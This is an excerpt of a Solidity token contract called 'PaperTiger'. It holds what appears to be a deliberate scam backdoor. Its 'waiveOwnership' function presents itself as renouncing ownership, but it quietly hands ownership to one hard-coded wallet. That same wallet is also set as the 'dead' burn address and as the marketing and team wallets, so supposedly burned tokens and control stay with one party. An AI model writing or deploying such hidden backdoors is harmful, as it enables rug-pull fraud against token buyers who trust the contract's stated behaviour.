...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x83952C4b98f09917d82D35818A4bDb1440C7fB00));
        _owner = address(0x83952C4b98f09917d82D35818A4bDb1440C7fB00);
    }
...
contract PaperTiger is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "PaperTiger";
    string private _symbol = "PaperTiger";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x83952C4b98f09917d82D35818A4bDb1440C7fB00);
    address payable public teamWalletAddress = payable(0x83952C4b98f09917d82D35818A4bDb1440C7fB00);
    address public immutable deadAddress = 0x83952C4b98f09917d82D35818A4bDb1440C7fB00;
